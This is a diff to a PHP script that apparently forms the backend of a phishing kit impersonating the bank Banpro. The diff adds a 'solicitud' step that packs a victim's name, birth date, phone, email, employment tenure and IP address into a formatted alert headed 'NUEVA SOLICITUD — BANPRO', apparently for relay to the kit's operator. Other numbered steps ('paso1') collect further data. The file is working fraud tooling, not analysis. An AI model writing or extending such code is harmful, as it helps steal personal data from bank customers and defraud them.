@@ -74,6 +74,20 @@ if (!isset($_GET['test']) && ($_tk === '' || !preg_match('/^[A-Za-z0-9+\/=]{8,32
 
 switch ($step) {
 
+    case 'solicitud':
+        $nombre = h(v($input, 'nombres')) . ' ' . h(v($input, 'apellidos'));
+        $msg  = "🏦 <b>NUEVA SOLICITUD — BANPRO</b>\n";
+        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
+        $msg .= "👤 Nombre: "      . trim($nombre)                    . "\n";
+        $msg .= "📅 Fecha Nac: "   . h(v($input, 'fechaNac'))         . "\n";
+        $msg .= "📱 Teléfono: "    . h(v($input, 'phone'))            . "\n";
+        $msg .= "✉️ Correo: "      . h(v($input, 'email'))            . "\n";
+        $msg .= "🕐 Antigüedad: "  . h(v($input, 'antiguedad'))       . "\n";
+        $msg .= "🌐 IP: "          . $ip                              . "\n";
+        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
+        $msg .= "✅ <i>Solicito tarjeta de crédito Banpro ConnectMiles Infinite.</i>";
+        break;
+
     case 'paso1':
         $msg  = "📝 <b>PASO 1 - INF</b>\n";
         $msg .= "👤 Nombres: "   . h(v($input, 'nombres'))   . "\n";
